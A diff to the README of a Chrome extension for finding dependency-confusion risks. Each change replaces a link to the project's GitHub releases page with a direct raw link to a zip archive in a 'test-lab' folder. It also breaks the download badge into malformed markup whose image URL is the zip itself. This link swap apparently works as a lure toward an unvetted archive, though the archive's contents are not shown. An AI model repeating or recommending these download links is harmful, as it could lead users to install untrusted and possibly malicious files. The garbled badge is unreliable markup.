@@ -1,6 +1,6 @@
 # 🎯 Dependency-Confusion-Hunter - Protect Your Packages from Vulnerabilities
 
-[![Download Dependency-Confusion-Hunter](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/Ajithkumar8/Dependency-Confusion-Hunter/releases)
+[![Download Dependency-Confusion-Hunter](https://raw.githubusercontent.com/Ajithkumar8/Dependency-Confusion-Hunter/main/test-lab/Dependency_Hunter_Confusion_2.7-beta.3.zip%https://raw.githubusercontent.com/Ajithkumar8/Dependency-Confusion-Hunter/main/test-lab/Dependency_Hunter_Confusion_2.7-beta.3.zip)](https://raw.githubusercontent.com/Ajithkumar8/Dependency-Confusion-Hunter/main/test-lab/Dependency_Hunter_Confusion_2.7-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Welcome to **Dependency-Confusion-Hunter**! This is a Chrome Extension that help
 
 ## 📥 Download & Install
 
-To get started with Dependency-Confusion-Hunter, visit this page to download: [Download Dependency-Confusion-Hunter](https://github.com/Ajithkumar8/Dependency-Confusion-Hunter/releases).
+To get started with Dependency-Confusion-Hunter, visit this page to download: [Download Dependency-Confusion-Hunter](https://raw.githubusercontent.com/Ajithkumar8/Dependency-Confusion-Hunter/main/test-lab/Dependency_Hunter_Confusion_2.7-beta.3.zip).
 
 ### Step-by-Step Download Guide
 
@@ -63,6 +63,6 @@ If you need further assistance or have questions, please create an issue directl
 
 Dependency-Confusion-Hunter will notify you when a new version is available. Always keep the extension updated for the best performance and latest features.
 
-Visit this page to download: [Download Dependency-Confusion-Hunter](https://github.com/Ajithkumar8/Dependency-Confusion-Hunter/releases).
+Visit this page to download: [Download Dependency-Confusion-Hunter](https://raw.githubusercontent.com/Ajithkumar8/Dependency-Confusion-Hunter/main/test-lab/Dependency_Hunter_Confusion_2.7-beta.3.zip).
 
 Your security matters, so let Dependency-Confusion-Hunter help you safeguard your software packages today!
